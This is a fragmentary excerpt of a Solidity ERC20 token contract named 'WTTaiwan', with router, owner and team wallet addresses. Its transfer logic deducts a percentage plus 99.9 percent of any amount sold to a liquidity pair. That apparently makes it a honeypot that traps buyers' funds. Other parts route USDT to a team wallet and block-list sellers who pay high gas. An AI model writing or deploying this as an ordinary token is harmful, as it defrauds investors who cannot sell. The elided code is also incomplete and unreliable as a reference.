...
contract  WTTaiwan is ERC20 {
    ...
    constructor() ERC20("WTTaiwan", "WTTW") {

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a uniswap pair for this new token
        _tokenOwner = address(0x857036c884ce0881A05efa0afa05A36352Ba958E);
        teamAddress =address(0xB87a5ab84184CB7d3602dFACd65436021Bf01802);
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if(ammPairs[to] ){
                ...
                amount = amount.sub(amount.mul(A).div(100)).sub(amount.mul(999).div(1000));
            }                        
        }
    ...
    function swapProc() public {
        ...
        if(balanceOf(address(this)) >= canSellAmount && canSellAmount >= amountT){
            ...
            IERC20(usdt).transfer(teamAddress,marketAmount.div(3));
    ...
    function antiBot(address sender,address recipient) public{
        ...
        if(ammPairs[recipient] && tx.gasprice > maxGasOfBot ){
            //if gas is too height . add to block list
